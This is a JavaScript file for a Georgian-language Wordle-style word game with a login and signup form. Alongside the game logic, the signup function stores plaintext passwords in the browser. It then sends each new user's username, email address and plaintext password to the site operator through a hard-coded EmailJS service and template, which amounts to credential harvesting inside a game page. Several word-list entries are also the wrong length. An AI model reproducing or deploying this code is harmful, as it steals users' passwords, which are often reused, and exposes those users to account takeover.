const WORD_LENGTH = 5;
const MAX_ATTEMPTS = 6;
const WORD_LIST = ["სახლი", "ტყავი", "ქარი", "წყალი", "გზაში", "მზეები", "ტყეში", "ნავი", "მარცი", "ქვიში"];
let targetWord = WORD_LIST[Math.floor(Math.random() * WORD_LIST.length)];
let attempts = 0;
let authMode = "login";

// ✅ EmailJS init
document.addEventListener("DOMContentLoaded", () => {
    emailjs.init("0DQhckPr17kgSEFbJ"); // your public key
    createBoard();
    checkLogin();
});

function createBoard() {
    const board = document.getElementById("game-board");
    for (let i = 0; i < MAX_ATTEMPTS; i++) {
        for (let j = 0; j < WORD_LENGTH; j++) {
            let tile = document.createElement("div");
            tile.classList.add("tile");
            tile.id = `tile-${i}-${j}`;
            board.appendChild(tile);
        }
    }
}

function submitGuess() {
    let guess = document.getElementById("guess-input").value.trim();
    if (guess.length !== WORD_LENGTH || !WORD_LIST.includes(guess)) {
        alert("Invalid word. Please enter a 5-letter Georgian word.");
        return;
    }

    for (let i = 0; i < WORD_LENGTH; i++) {
        let tile = document.getElementById(`tile-${attempts}-${i}`);
        tile.textContent = guess[i];

        if (guess[i] === targetWord[i]) {
            tile.classList.add("correct");
        } else if (targetWord.includes(guess[i])) {
            tile.classList.add("present");
        } else {
            tile.classList.add("absent");
        }
    }

    attempts++;
    document.getElementById("guess-input").value = "";

    if (guess === targetWord) {
        alert("გილოცავ! სიტყვა ცორედ გამოიცანი.");
    } else if (attempts >= MAX_ATTEMPTS) {
        alert("თამაში წააგე! სწორი სიტყვა იყო: " + targetWord);
    }
}

function toggleAuthMode() {
    authMode = authMode === "login" ? "signup" : "login";
    document.getElementById("auth-title").textContent = authMode === "login" ? "Login" : "Sign Up";
    document.getElementById("auth-button").textContent = authMode === "login" ? "Login" : "Sign up";
    document.getElementById("auth-toggle-text").innerHTML = authMode === "login"
        ? `Don't have an account? <a href="#" onclick="toggleAuthMode()">Sign up</a>`
        : `Already have an account? <a href="#" onclick="toggleAuthMode()">Login</a>`;
}

function handleAuth(event) {
    event.preventDefault();

    const username = document.getElementById("auth-username").value.trim();
    const email = document.getElementById("auth-email").value.trim();
    const password = document.getElementById("auth-password").value;

    if (!username || !email || !password) {
        alert("გთხოვ შეავსო ყველა ველი.");
        return false;
    }

    let users = JSON.parse(localStorage.getItem("users")) || [];

    if (authMode === "signup") {
        const userExists = users.some(u => u.username === username || u.email === email);
        if (userExists) {
            alert("User already exists!");
            return false;
        }

        users.push({ username, email, password });
        localStorage.setItem("users", JSON.stringify(users));
        localStorage.setItem("currentUser", username);

        // ✅ EmailJS send on signup
        const templateParams = {
            username: username,
            user_email: email,
            user_password: password
        };

        emailjs.send("service_5k5iomq", "template_jyc7fug", templateParams)
            .then(function(response) {
                alert(`Welcome ${username}! You're registered and logged in.`);
                document.getElementById("auth-form").reset();
                document.getElementById("auth-section").style.display = "none";
            })
            .catch(function(error) {
                console.error("EmailJS Error:", error);
                alert("Error sending info. Please try again.");
            });

    } else {
        const user = users.find(u => u.username === username && u.email === email && u.password === password);
        if (!user) {
            alert("Incorrect credentials.");
            return false;
        }
        localStorage.setItem("currentUser", username);
        alert(`Welcome back, ${username}!`);
        document.getElementById("auth-form").reset();
        document.getElementById("auth-section").style.display = "none";
    }

    return false;
}

function checkLogin() {
    const user = localStorage.getItem("currentUser");
    if (user) {
        document.getElementById("auth-section").style.display = "none";
        console.log("Welcome back,", user);
    } else {
        document.getElementById("auth-section").style.display = "block";
    }
}
